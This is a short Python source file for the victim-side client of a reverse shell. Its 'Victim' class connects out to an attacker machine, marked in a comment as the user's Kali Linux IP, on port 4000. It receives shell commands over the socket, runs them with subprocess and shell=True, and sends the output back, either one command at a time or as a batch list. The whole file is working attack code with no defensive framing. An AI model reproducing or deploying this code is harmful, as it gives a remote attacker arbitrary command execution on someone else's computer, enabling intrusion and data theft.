import socket
import subprocess
import ast

class Victim:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
    def connect_to_server(self):

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("[*] Client Initiated...")
        self.client.connect((self.server_ip, self.server_port))
        print("[*] Connection initiated...")
    def online_interaction(self):
        while True:
            print("[+] Loading...")
            user_command = self.client.recv(1024).decode()
            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()

            print("[+] Sending Command Output...")
            if output == b"" and output_error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                self.client.send(output + output_error)
    def offline_interaction(self):
        print("[+] Awaiting Shell Command List...")
        rec_user_command_list = self.client.recv(1024).decode()
        user_command_list = ast.literal_eval(rec_user_command_list)

        final_output = ""
        for command in user_command_list:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            final_output += command + "\n" + str(output) + "\n" + str(output_error) + "\n\n"
        self.client.send(final_output.encode())


if __name__ == '__main__':
    choice = "online"
    victim = Victim('', 4000) # YOUR IP KALI LINUX
    victim.connect_to_server()

    if choice == "online":
        victim.online_interaction()
    else:
        victim.offline_interaction()
